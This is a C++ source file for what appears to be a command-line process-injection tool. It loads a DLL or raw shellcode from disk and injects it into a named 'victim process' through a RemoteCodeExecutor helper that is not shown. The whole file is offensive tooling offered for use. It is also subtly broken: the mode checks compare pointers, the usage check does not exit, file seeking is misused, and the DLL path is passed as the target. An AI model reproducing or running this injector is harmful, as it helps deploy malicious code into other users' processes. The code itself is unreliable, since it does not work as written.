#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <exception>

#include "domain.h"
#include "remote_code_executor.h"
#include <vector>
#include <cstdint>


int main(int argc, char** argv) {
    if (argc != 4) {
        std::cout << "Usage: " << argv[0] << " <dll/sc> <dll/shellcode file> <victim process>";
    }
    std::filesystem::path dll_path(std::filesystem::current_path() / argv[2]);
    if (!std::filesystem::exists(dll_path)) {
        std::wcout << "file do not exist " << dll_path.wstring() << std::endl;
        return 1;
    }

    try {
        if (argv[1] == "dll") {
            RemoteCodeExecutor::InjectDLL(dll_path.wstring(),
                domain::StringToWideChar(argv[2]));
        }
        else if (argv[1] == "sc") {
            std::ifstream shellcode(dll_path);
            shellcode.seekg(std::ios::end);
            size_t size = shellcode.tellg();
            shellcode.seekg(std::ios::beg);

            std::vector<uint8_t> buffer(size);
            shellcode.read(reinterpret_cast<char*>(buffer.data()), size);
            RemoteCodeExecutor::InjectShellcode(buffer.data(), size,
                domain::StringToWideChar(argv[3]));
        }
        std::wcout << "Successfully inject " << argv[1] << " to " << argv[3] << std::endl;
    }
    catch (const std::exception& e) {
        std::cerr << "Injection error: " << e.what() << std::endl;
    }
}
